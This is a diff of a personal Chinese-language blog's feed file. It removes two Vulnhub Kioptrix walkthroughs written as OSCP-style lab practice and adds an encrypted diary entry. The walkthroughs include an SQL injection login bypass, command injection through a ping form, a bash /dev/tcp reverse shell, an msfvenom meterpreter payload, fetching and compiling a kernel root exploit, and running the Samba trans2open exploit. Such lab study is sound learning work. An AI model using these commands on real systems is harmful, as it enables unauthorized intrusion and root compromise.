-<p>参考 <a href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io)</a></p>
-</blockquote>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
-<ul>
-<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
-<li>nmap扫描端口及端口服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure>
-<p><strong>看到了web服务：80端口和443端口</strong></p>
-<ul>
-<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>F12 查看源代码</li>
-</ul>
-<img src="/2024/02/03/Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
-<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
-<h4 id="我的体验"><a class="markdownIt-Anchor" href="#我的体验"></a> 我的体验</h4>
-<p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
-<h3 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h3>
-<h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> Sql注入</h4>
-<ul>
-<li>
-<p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>' or '1' = '1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
-</li>
-<li>
-<p>还有一篇walkthrough里面有人是username输入<code>admin' or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
-<ul>
-<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
-</ul>
-</li>
-<li>
-<p>成功后看到以下页面：</p>
-</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h4 id="寻找漏洞rce漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞rce漏洞"></a> 寻找漏洞：RCE漏洞</h4>
-<ul>
-<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
-<p><strong>证明确实存在RCE</strong></p>
-<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
-<h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5>
-<blockquote>
-<p>参考 <a href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p>
-</blockquote>
-<h6 id="0x01-bash建立tcp连接"><a class="markdownIt-Anchor" href="#0x01-bash建立tcp连接"></a> 0x01 bash建立tcp连接</h6>
-<ul>
-<li>
-<p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
-</li>
-<li>
-<p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
-</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
-<h6 id="0x02-msfvenom生成后门"><a class="markdownIt-Anchor" href="#0x02-msfvenom生成后门"></a> 0x02 msfvenom生成后门</h6>
-<blockquote>
-<p>参考<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<ul>
-<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure>
-<h3 id="linux-提权-linux-privilege-escalation"><a class="markdownIt-Anchor" href="#linux-提权-linux-privilege-escalation"></a> Linux 提权  Linux Privilege Escalation</h3>
-<blockquote>
-<p>参考 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p>
-</blockquote>
-<h4 id="提权信息收集"><a class="markdownIt-Anchor" href="#提权信息收集"></a> 提权信息收集</h4>
-<ul>
-<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure>
-<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>发现Linux版本是CentOS 4.5</strong></p>
-<ul>
-<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
-</ul>
-<blockquote>
-<p>关于工具使用：<a href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客</a></p>
-</blockquote>
-<h4 id="寻找centos-45漏洞利用提权脚本"><a class="markdownIt-Anchor" href="#寻找centos-45漏洞利用提权脚本"></a> 寻找CentOS 4.5漏洞利用提权脚本</h4>
-<ul>
-<li><code>searchsploit CentOS 4.5</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
-</ul>
-<h4 id="将脚本传到靶机"><a class="markdownIt-Anchor" href="#将脚本传到靶机"></a> 将脚本传到靶机</h4>
-<h5 id="0x01-python-simplehttpserver-快速共享当前目录"><a class="markdownIt-Anchor" href="#0x01-python-simplehttpserver-快速共享当前目录"></a> 0x01 Python SimpleHTTPServer 快速共享当前目录</h5>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark><em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em></mark></p>
-<ul>
-<li>同时在攻击机上也可以看到靶机的信息</li>
-</ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="0x02-service-apache2-start"><a class="markdownIt-Anchor" href="#0x02-service-apache2-start"></a> 0x02 service apache2 start</h5>
-<ul>
-<li>
-<p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
-</li>
-<li>
-<p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
-</li>
-<li>
-<p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
-</li>
-<li>
-<p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
-</li>
-</ul>
-<h4 id="编译运行脚本"><a class="markdownIt-Anchor" href="#编译运行脚本"></a> 编译运行脚本</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2>
-<blockquote>
-<p>优秀总结：<a href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<h3 id="关于631端口-ipp服务-cups-11"><a class="markdownIt-Anchor" href="#关于631端口-ipp服务-cups-11"></a> 关于631端口 ipp服务 CUPS 1.1</h3>
-<ul>
-<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
-</ul>
-<h3 id="关于渗透方向"><a class="markdownIt-Anchor" href="#关于渗透方向"></a> 关于渗透方向</h3>
-<ul>
-<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
-</ul>
-<h3 id="关于-linux-提权"><a class="markdownIt-Anchor" href="#关于-linux-提权"></a> 关于 Linux 提权</h3>
-<ul>
-<li>
-<p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
-</li>
-<li>
-<p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
-<ul>
-<li>LinEnum 可以枚举信息</li>
-<li><a href="http://lse.sh">lse.sh</a> 可以枚举一些系统可能存在的漏洞信息</li>
-</ul>
-<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
-</li>
-<li>
-<p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
-</li>
-</ul>
-<h3 id="关于主机间传文件-via-http"><a class="markdownIt-Anchor" href="#关于主机间传文件-via-http"></a> 关于主机间传文件 via http</h3>
-<ul>
-<li>Python建立简单http服务</li>
-<li>在攻击机中开启apache</li>
-</ul>
-<h3 id="关于web渗透sql注入"><a class="markdownIt-Anchor" href="#关于web渗透sql注入"></a> 关于web渗透sql注入</h3>
-<ul>
-<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> MISC-压缩包 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mad1sun&#39;s_diary</title>
+      <link href="/2024/03/04/Mad1sun-s-diary/"/>
+      <url>/2024/03/04/Mad1sun-s-diary/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="93bed56989928bfd1702396721f47ceb8df71478bd21cfbc5b4cc75c530fc856">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119e647972283f72285032891ec52e4ea75b276910eb2508d5794abd40c1ec3fe8148c18273ed597fedbca724526f92718026004fff4b812dcc2ec3f03465f7c7ac6c21caea4297e2b32b115722f5d44753008bb543edd37b1b1bc29078a6e5e17be7c28371b6c513308a0ccd522518e5bb609ae83439720b93bda58d62d8d10877e0ec9523e7506ec85f48cfbcc08d040eb161198f8cdc01df05a817597c0240d56e192c6d6ec1f937ec175be9857ecd12eef8e22fc5d25954af4e95d7d19fbb6ffb6d2ac522594715497c641906e695e8e1d78c2fa97359d23a15916941416fe1f053bd58001295bc0ec7c641acc974f71181e8d2b19485be8ab18142c65cb61aaa42893e4ae6f4b57790559c210199e6c94f8ad8e2e9ef50dde5a920082c9b74dcfc77e176760ae12cbf92a7e2f16840ec47baddf556a3c56f2a671b2fc66f834aece8e27718d2237158c0ecfa58c5bc8283c81a821c419b13f614f057a351a4fb8d7f64d9a9099b4e53a2ac8d97515007e65ea46669d18dbabba2bbf62932cc1c4fced8f5975e00b790c028bee0c56ba028fc2b369435145ac22b763509ed62a901a25700d19acf3745fdd32d5db4d875f4bb70192b9247be22a1e9c8e99a166eae017af46b567aa8ba338e981e46193c2b9f5a5cd4015480e9b3d57a26154a8ad747d8229158a6f49e56dd98fe683d207a2fb608b17be8e2b015b6f2d57397e7b8d42808effdd096d28fe92066b7691c3ea99aefc6b19fad85475ff4581f4ae4a1915e9cb308655a17973c6a0a85415280a05cad9be0c0089e92a01d8bf7c65509890c8e4c6f13a95ad9fe3311cf9739ee60f167b43a145f6c236c9e676ca2a2f0061fcfc453433349469520997d460269dbe7ca5c9de010e1ba85021de577e559562e447b11ec739e6c3840adc8f0beacf1617602e08043ef938c7de7521d471f820b7a47b242d660f42ae53da2018c51b6f9ca681af2c44e48dfd6db15845ade04cad1be5ef31efc4a64e72f4e590b608dab3ddc0ba1cbaf73aef7075eddd386d29a401d7cf16960ffb717f44dd134dc4e8e656e7aa45753350788f3b8a609937b1f6bb33ec5d91fabca8daf6d9556643876e229a734df585732580499b94153bbe34ac938208b85832722cc7683d44bc00a2d26c3b810d2e80801ef9f31ea1d0ba1beec386f22fddb714d2cdbd16b0ed894ee8036a176e9823752e58178367810c935efe1db263de27fadd8a50c70d180a42b0a01bca214cab6cb38f147ebf4be9a59e74f911d2feddd543cb409f9fcae7ea492a1048a771e5a0acd7641a23e8abab0b258e5d9d6884c14c5afaed7e1e1ee9fd814c85f557ac058e3206d2aa74ce44849dd590c9c7f9d1855d21a74d08361303970dae8b1ca987d2680a1b4be63a88ccade0052f2e9f2d53d836e77c9865a8226f1fcbe809e24f1ddd5aeed864a05916ec491840b822ae62f7f6895bfced50132a038ecccc44d0db7f0aa0f16034fb75667566015e510aec0ca6b21cd0f3323ff266d695ea63fcdb003dff509ad8363d855268f6710985e5eb8b19f71263407887812ae82540df1973c2c13eae790c1b93061e8d81817780fbebdc756213beccfec8905d681ef60783360884995f975c34f61602f9524800f61d6fe7ed90836915a962a0f7dce3a3d9df18037514b750d42902faaee62b28081863b5c03da75713e2001c187d52620565baa89d55f7429004e1169c8e1908685b89efc9eca11451b4012bc9addd3e5c0f33cf04de874a1ada09d82e34f40eb984bcd7530b888af3777b9f1ecf96a94b65f77d686574dcedefac63eb7e966ddc6ac6e97293ca04fe8060386a54264a6a7f78b818e0629c7700fc79ea2db094060731e053bf174ca16c2ea6b6e6f833e562c4e415020e64d8a10c6a082564768bd2fed72c28cbf1547b7c1540e85b003bc436811dfc6f388ace70f40b9d3782355933daf24ca4b3cf140c89c6aab98d0deee361dabfc57ff1c6dac8c9c1d5d1ad15b25422784a0c9c50a91bbc396f84e9450177a2c94c3f93e5ea28f38a1ea48b3faab06802953a03e2fc3950dafc37e0b6dc3f644a564788d5d97d09f56daa1fb4f1f52f5645b8002cae2415704508a93af450cf45ae483debc2ffb11c49ca3c170970e793f31b09cde9ca15c10e5b29b8ea9a04412ad4db8308abcc7d47fb7ed0cd06215e107f4c198a40111afd657d4167b128208c4f4f5fc6840b2d63f6d436a6187f9798299cbfa58daa5f45470f0b23f6b5b72aa6d6516f4bbf0e70eb26c6c17eb7eaac92c0c91698b501ea3762b8d1ed13102f3644b0105fcb5d5c2bbe231bd419d7c4ed64a5e2a2c8f157bafeff9672925a776b1a1a53f161f654fa17f4821e8771733fb68d64f9ef1b59a510e24334191c9cf71cc091863b67cfafe6c78a609db703c4760f2a85ba1748ead74bd0adee0eba8cf59355922a2093883ab0476d578d8362b6e4d19a06ff457a63b82f06db7aa77aa275b33ce70154862f3c6d6eba129d22033fb11ac5db2b3dcc6ca187c9fde32bf9ca324ab5b2254a51d41a0885470bbf5498f429389b173fb24301daf71f862c57a1496ba52678a0e186b9a29f03613f6060d664206054db2e6d51a5446004d487705799779b30ac313fb93614814e86fc436129ef6101101804e2186c8a85cdf4acc5fb9386e09d1fe702367e072447b6aee44f54d386d4a88439979176855860ea5407cd2b355a76738c65869056e428880394d5d17f4f129c4ddb19aab4f9a15695863fc5a489f85b78d32db6e752adecd02feb8b996a13c7af9cbd7b066b2537dd9cc4dee727a18ed2c54e80554ac125b5df007008be37b7442f207adcc9bdc8001abf20f0684b7009cc0b099c6d3e0c99dc012b2a4554f9718798772edfa973c086f365c0b6fc1092298b0a2c81b8eb848a543e4fe521e3af1d1d51324c945f6d4350d2d8aa436aaa05ec4a342b97ed7c9e5c2bc1eb2be34b2f56bd98a01f9d70e4c97ab4d43f0b386c1a7318e8dc465e5e7a45352a60dd41e8f59cceb1eb552def451f27f6e4d71eb353839198cf8c4f3b892e92467b8c4ebdcad42d99acced18771ae1d4e16add0ed2ea026c361818565e5e461d1f4cbea44fd90bf88a2099848e0a5b2343fa4e1e3af5364c8ea5565a84fca9ba5f0c34e531c1cb560b93a1e5c55b0eefb089f4553b3c6f388038bcb4156b354494073509d5f39101bb311cae992b796f173e6529a173ded79d27703ec5deb55b981f36e1556078acac6a0f9f579b28aa5a31ac9b0b76053984a468f093bad15dce44effbadf610239edea7147ffb024abadb601982ea97a46ca520726b7b5bf6b5e0a36b6c9101130233d96eadc541fdd9290536d21516fa0b5b57e8b2bd3b635ba6ecc5043bff372fffd4dc5a1bd0857f3ef9b9cb24d5a8bcc51cf776fe4fca11326622c23b6cec599b59703ee8f9107e6a04bc5b095073ca4e1d571bedacd3b28a6625c1fe0f4e3147cb19345fbb2e48285436bf134fdcaa883e02e301e755bea767fb50c024d316a9c297389efc9b5820ec9c67498cbb0f3507937d2eac7948ef679087bd1486e9bcd94bd0efe2b2d50fa1b34c4a35bf2507c3d1dbe15ce5b0e816a5d27f07f6e3eefdefa7c5ceeed321081f94680778b66302a021093fedca63472fba945bd9708c507685c89ce25afc79</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> Mad1sun的生活小日记 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptrix Level 1</title>
-    <url>/2024/01/29/Kioptrix_Level_1/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-1"><a class="markdownIt-Anchor" href="#kioptrix-level-1"></a> Kioptrix Level 1</h1>
-<blockquote>
-<p>参考 <a href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
-<ul>
-<li>nmap扫描附近存活主机ip</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure>
-<p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p>
-<ul>
-<li>nmap扫描端口</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure>
-<p>-sV 列举出端口使用协议或服务的版本信息</p>
-<p>-p- 扫描全端口</p>
-<p>-T4 设置线程数 <code>加快扫描速度</code></p>
-<p><strong>开放端口信息：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure>
-<h3 id="思路1samba-139端口"><a class="markdownIt-Anchor" href="#思路1samba-139端口"></a> 思路1——Samba 139端口</h3>
-<h4 id="查询samba版本"><a class="markdownIt-Anchor" href="#查询samba版本"></a> 查询Samba版本</h4>
-<ul>
-<li>
-<p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p>
-<ul>
-<li>smbclient -L=<ip></ip></li>
-</ul>
-</li>
-<li>
-<p>这里使用metasploit的Auxiliary模块</p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark>注意：oscp中不允许使用msf，这里仅供学习</mark></p>
-<h4 id="寻找exploit"><a class="markdownIt-Anchor" href="#寻找exploit"></a> 寻找exploit</h4>
-<ul>
-<li>工具：<code>searchsploit</code></li>
-<li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>发现存在trans2open Overflow的漏洞</strong></p>
-<ul>
-<li>
-<p>在github中找到了脚本：<a href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c</a></p>
-</li>
-<li>
-<p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p>
-</li>
-</ul>
-<h4 id="编译和运行脚本"><a class="markdownIt-Anchor" href="#编译和运行脚本"></a> 编译和运行脚本</h4>
-<h5 id="github脚本"><a class="markdownIt-Anchor" href="#github脚本"></a> github脚本</h5>
-<ul>
-<li>
-<p>编译：<code>gcc trans2open.c -o trans2open </code></p>
-</li>
-<li>
-<p>运行：<code>./trans2open</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="searchsploit自带脚本"><a class="markdownIt-Anchor" href="#searchsploit自带脚本"></a> searchsploit自带脚本</h5>
-<ul>
-<li>
-<p>编译</p>
-</li>
-<li>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           